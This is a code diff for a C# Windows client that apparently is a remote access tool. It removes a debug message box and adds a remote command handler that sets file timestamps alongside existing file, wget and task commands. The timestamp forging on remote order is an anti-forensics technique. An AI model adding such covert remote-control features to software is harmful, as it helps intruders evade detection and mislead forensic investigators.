@@ -56,12 +56,6 @@ namespace winClient48
 
         public Form1(string[] args)
         {
-            m_args = args;
-            if (m_args.Length > 0 && m_args[0] == "mem")
-            {
-                MessageBox.Show("OK");
-            }
-
             InitializeComponent();
         }
 
@@ -604,6 +598,7 @@ namespace winClient48
 
                 #endregion
                 #region FileMgr
+
                 else if (cmd[0] == "file")
                 {
                     if (funcFile == null)
@@ -844,7 +839,19 @@ namespace winClient48
 
                         v.SendCommand($"file|wget|status|{cmd[2]}|{Crypto.b64E2Str(x.Item3)}|{x.Item1}|{Crypto.b64E2Str(x.Item2)}");
                     }
+                    else if (cmd[1] == "ts")
+                    {
+                        bool bIsFile = cmd[2] == "1";
+                        string szFilePath = Crypto.b64D2Str(cmd[3]);
+                        EntityTimestampType etType = (EntityTimestampType)int.Parse(cmd[4]);
+                        DateTime time = DateTime.Parse(Crypto.b64D2Str(cmd[5]));
+
+                        var x = funcFile.fnSetEntityTimestamp(bIsFile, szFilePath, etType, time);
+
+                        v.SendCommand($"file|ts|{x.nCode}|{Crypto.b64E2Str(x.szMsg)}");
+                    }
                 }
+
                 #endregion
                 #region TaskMgr
                 else if (cmd[0] == "task")
